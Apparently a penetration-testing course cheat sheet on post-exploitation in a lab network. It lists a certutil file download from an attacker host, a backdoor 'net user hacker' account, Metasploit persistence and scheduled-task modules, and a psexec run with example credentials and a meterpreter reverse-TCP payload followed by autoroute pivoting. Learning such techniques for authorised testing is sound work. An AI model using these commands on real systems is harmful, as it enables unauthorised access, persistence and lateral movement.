# Post Exploitation

## File Transfers Review

Certutil
```
- certutil.exe -urlchache -f hxxp://10.10.10.10/file.txt file.txt
```

HTTP
```
- python3 -m http.server
```

Browser
```
- Navigate directly to file
```

FTP
```
- python -m pyftpdlib 21 (attacker machine)
- ftp 10.10.10.10
```

Linux
```
- wget
```

## Maintaining Access

Persistence Scripts (MetaSploit)
```
- run persistence -h
- exploit/windows/local/persistence
- exploit/windows/local/registry_persistence
```

Scheduled Tasks
```
- run scheduleme
- run schtaskabuse
```

Add a User
```
- net user hacker password123 /add
```

## Pivoting

Lab Setup:
```
- Modify Network Settings on Windows machines
- File > Edit > Virtual Network Editor
- Change Settings > Add Network > Host Only > 10.10.10.0 > Apply
- Edit Virtual Settings > Add Network Adapter > Custom > VMNet
```

MetaSploit
```
- msfconsole
- use exploit/windows/smb/psexec
- options
- set RHOST 192.168.57.41
- set smbdomain marvel.local
- set smbpass Password1
- set smbuser fcastle
- set payload windows/x64/meterpreter/reverse_tcp
- set lhost eth0
- options
- set target 2
- run
- shell
- route print
- ipconfig
- arp -a
- ^C
- run autoroute -s 10.10.10.0/24
- run autoroute -p
- background
- search portscan
- use auxiliary/scanner/portscan/tcp
- set rhosts 10.10.10.129
- set port 445
- run
```

## Cleaning Up

Make the system/network as it was when you entered it
- Remove executables, scripts, and added files
- Remove malware, rootkits, and added user accounts
- Set settings back to original configurations
